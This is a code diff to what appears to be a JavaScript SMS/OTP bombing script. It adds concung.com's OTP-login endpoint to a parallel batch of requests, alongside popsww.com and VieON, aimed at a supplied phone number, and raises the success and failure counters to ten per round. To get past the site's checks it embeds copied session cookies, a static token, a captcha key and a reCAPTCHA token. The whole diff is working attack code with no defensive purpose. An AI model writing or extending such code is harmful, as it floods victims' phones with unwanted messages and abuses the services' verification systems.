@@ -256,6 +256,52 @@ const payload = {
       recaptcha: '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w',
     };
 
+    const cookies = {
+        'PHPSESSID': 'j7jhajmp8628ho9d98bckrhkog',
+        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D',
+        '_ga': 'GA1.1.1223576462.1703858206',
+        '__utma': '65249340.1223576462.1703858206.1703858250.1703858250.1',
+        '__utmc': '65249340',
+        '__utmz': '65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
+        '__utmt': '1',
+        '_gcl_au': '1.1.854737399.1703858251',
+        '_ga_DFG3FWNPBM': 'GS1.1.1703858205.1.1.1703858365.60.0.0',
+        '__utmb': '65249340.2.10.1703858250',
+        '__admUTMtime': '1703858368',
+        '_tt_enable_cookie': '1',
+        '_ttp': 'FLrVXJT5FMP_B9az47LH6-P6_GD',
+        '_ga_BBD6001M29': 'GS1.1.1703858371.1.0.1703858371.60.0.0',
+        '_fbp': 'fb.1.1703858371624.505444992',
+        'dtdz': '39b60b4b-5c1c-40f7-a1fa-1775072dd497',
+        '__iid': '',
+        '__iid': '',
+        '__su': '0',
+        '__su': '0',
+        'Srv': 'cc204|ZY7Qz|ZY7QH',
+    };
+
+    const headers = {
+      'authority': 'concung.com',
+      'accept': '*/*',
+      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+      'dnt': '1',
+      'origin': 'https://concung.com',
+      'referer': 'https://concung.com/dang-nhap.html',
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      'x-requested-with': 'XMLHttpRequest',
+    };
+
+    const data = {
+      'ajax': '1',
+      'classAjax': 'AjaxLogin',
+      'methodAjax': 'sendOtpLogin',
+      'customer_phone': phone,
+      'statictoken': 'e633865a31fa27f35b8499e1a75b0a76',
+      'captcha_key': '9a1b5162bfa438e4ead921afe49cc8d3',
+      'id_customer': '0',
+    };
+
 
 
     // Initial message to be edited later
@@ -304,14 +350,15 @@ const payload = {
   headers: vieonHeaders,
   params: params
 }), 
-        axios.post('https://products.popsww.com/api/v5/auths/register', popsData, { headers: popsHeaders })
+        axios.post('https://products.popsww.com/api/v5/auths/register', popsData, { headers: popsHeaders }), 
+        axios.post('https://concung.com/ajax.html?sendOtpLogin', data, { headers: headers, withCredentials: true, jar: cookies })
       ])
       .then(() => {
-        successCount += 9;
+        successCount += 10;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 9;
+        failureCount += 10;
         updateMessage();
       });
     };
